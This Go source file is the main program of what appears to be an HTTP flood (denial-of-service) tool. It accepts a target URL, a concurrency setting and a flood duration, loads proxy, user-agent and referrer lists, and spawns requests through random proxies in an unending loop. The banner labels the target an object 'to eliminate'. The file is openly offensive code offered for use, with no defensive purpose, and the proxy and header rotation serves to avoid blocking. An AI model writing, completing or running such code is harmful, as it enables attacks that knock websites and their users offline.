package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"z3ntl3/cursed-objects/bot"
	"z3ntl3/cursed-objects/fancy"
	"z3ntl3/cursed-objects/filesystem"
	"z3ntl3/cursed-objects/globals"
)

var (
	target = flag.String("url", "", "Target URL. Examples: https://github.com or http://google.com")
	concurrency = flag.Int("concurrency", 2000, "Defines concurrency across requests")
	duration = flag.Int("duration", 300, "Flood duration in seconds")
)

func main(){
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	rand.Seed(time.Now().Unix())

	logo := fancy.BuildLogo()
	logo.Colorize()

	// lil dirty but who cares
	fmt.Fprint(os.Stdout, *logo)
	fmt.Fprint(os.Stdout, "\r\n   \x1b[1mYour object to eliminate\x1b[0m \x1b[1m\"\x1b[0m\x1b[31mthings\x1b[0m\x1b[1m\"\x1b[0m")
	fmt.Fprint(os.Stdout, "\r\n              \x1b[1m\x1b[38;5;201m@\x1b[38;5;93mz3ntl3\x1b[0m\n\n")

	fmt.Fprintf(os.Stdout, "\x1b[1m[CPU]\x1b[0m %d - Amount of CPU's reserved for flood\r\n\n", cpus)

	flag.Parse()

	if *target == "" || !strings.Contains(*target, "http://") && !strings.Contains(*target, "https://") {
		log.Fatal("Please satisfy http://domain.com or https://domain.com on flag target")
	}

	base, err := os.Getwd(); if err != nil {
		log.Fatal(err)
	}

	files := []string{
		"accepts.txt",
		"proxies.txt",
		"refs.txt",
		"uas.txt",
	}

	
	for i := 0; i < len(files); i++ {
		file := files[i]
		name := strings.Split(file,".txt")[0]

		data, err := filesystem.Read(filepath.Join(base, file)); if err != nil {
			log.Fatal(err)
		}
		globals.Table[name] = data
	}

	bot := &bot.BotClient{
		Target: *target,
		StopAt: time.Now().Add(time.Duration(time.Second * time.Duration(*duration))),
		Concurrency: *concurrency,
	}
	for {
		go func(){
			proxy := globals.Table[globals.PROXIES][rand.Intn(len(globals.Table[globals.PROXIES]))]
			err := bot.Request(proxy); if err != nil {
				fmt.Printf("[ERR]: %s", err)
			}
		}()
	}
}